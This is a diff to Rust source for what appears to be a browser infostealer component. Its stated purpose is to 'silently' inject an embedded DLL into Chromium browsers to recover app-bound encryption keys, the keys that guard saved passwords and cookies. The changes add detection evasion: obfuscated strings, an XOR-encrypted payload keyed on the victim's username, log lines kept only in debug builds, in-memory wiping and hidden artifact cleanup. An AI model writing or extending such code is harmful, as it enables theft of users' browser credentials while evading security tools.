@@ -1,44 +1,79 @@
 //! Silent Chromium app-bound key recovery (embedded DLL, temp extract, auto cleanup).
 
 use std::{collections::HashMap, collections::HashSet, path::PathBuf, sync::Mutex};
+use obfstr::obfstr;
 
 const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));
 
 static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
 static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);
 
+fn xor_key_from_username() -> [u8; 32] {
+    let username = std::env::var(obfstr!("USERNAME")).unwrap_or_default();
+    let mut key = [0u8; 32];
+    let bytes = username.as_bytes();
+    if bytes.is_empty() {
+        return key;
+    }
+    for (i, slot) in key.iter_mut().enumerate() {
+        *slot = bytes[i % bytes.len()];
+    }
+    key
+}
+
+fn decrypt_embedded_payload(encrypted: &[u8]) -> Vec<u8> {
+    let key = xor_key_from_username();
+    encrypted
+        .iter()
+        .enumerate()
+        .map(|(i, b)| b ^ key[i % 32])
+        .collect()
+}
+
 pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
     if EMBEDDED_PAYLOAD.is_empty() {
-        crate::log::log(&format!("inject skip: empty payload ({browser_name})"));
+        #[cfg(debug_assertions)]
+        crate::log::log(&format!(obfstr!("inject skip: empty payload ({})"), browser_name));
         return None;
     }
 
     if let Ok(guard) = FAIL_CACHE.lock() {
         if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
-            crate::log::log(&format!("inject skip: prior fail ({browser_name})"));
+            #[cfg(debug_assertions)]
+            crate::log::log(&format!(obfstr!("inject skip: prior fail ({})"), browser_name));
             return None;
         }
     }
     if let Ok(guard) = KEY_CACHE.lock() {
         if let Some(map) = guard.as_ref() {
             if let Some(key) = map.get(browser_name) {
-                crate::log::log(&format!("inject cache hit: {browser_name}"));
+                #[cfg(debug_assertions)]
+                crate::log::log(&format!(obfstr!("inject cache hit: {}"), browser_name));
                 return Some(key.clone());
             }
         }
     }
 
+    #[cfg(debug_assertions)]
     crate::log::log(&format!(
-        "inject start: {browser_name} (payload {} bytes)",
+        obfstr!("inject start: {} (payload {} bytes)"),
+        browser_name,
         EMBEDDED_PAYLOAD.len()
     ));
-    let key = match inject::recover_key(browser_name, EMBEDDED_PAYLOAD) {
+
+    let mut decrypted = decrypt_embedded_payload(EMBEDDED_PAYLOAD);
+    let key = match inject::recover_key(browser_name, &decrypted) {
         Some(k) => {
-            crate::log::log(&format!("inject OK: {browser_name}"));
+            #[cfg(debug_assertions)]
+            crate::log::log(&format!(obfstr!("inject OK: {}"), browser_name));
             k
         }
         None => {
-            crate::log::log(&format!("inject FAIL: {browser_name}"));
+            #[cfg(debug_assertions)]
+            crate::log::log(&format!(obfstr!("inject FAIL: {}"), browser_name));
+            unsafe {
+                std::ptr::write_bytes(decrypted.as_mut_ptr(), 0, decrypted.len());
+            }
             if let Ok(mut guard) = FAIL_CACHE.lock() {
                 if guard.is_none() {
                     *guard = Some(HashSet::new());
@@ -50,6 +85,9 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
             return None;
         }
     };
+    unsafe {
+        std::ptr::write_bytes(decrypted.as_mut_ptr(), 0, decrypted.len());
+    }
 
     if let Ok(mut guard) = KEY_CACHE.lock() {
         if guard.is_none() {
@@ -66,10 +104,10 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
 // Legacy cleanup for old runs that wrote to fixed paths.
 pub fn cleanup_legacy_artifacts() {
     let legacy = [
-        PathBuf::from(r"C:\Users\Public\chrome_recovery_result.json"),
-        PathBuf::from(r"C:\Users\Public\cr_debug.log"),
-        std::env::temp_dir().join("chrome_recovery_result.json"),
-        std::env::temp_dir().join("cr_headless_profile"),
+        PathBuf::from(obfstr!(r"C:\Users\Public\chrome_recovery_result.json")),
+        PathBuf::from(obfstr!(r"C:\Users\Public\cr_debug.log")),
+        std::env::temp_dir().join(obfstr!("chrome_recovery_result.json")),
+        std::env::temp_dir().join(obfstr!("cr_headless_profile")),
     ];
     for path in legacy {
         if path.is_dir() {
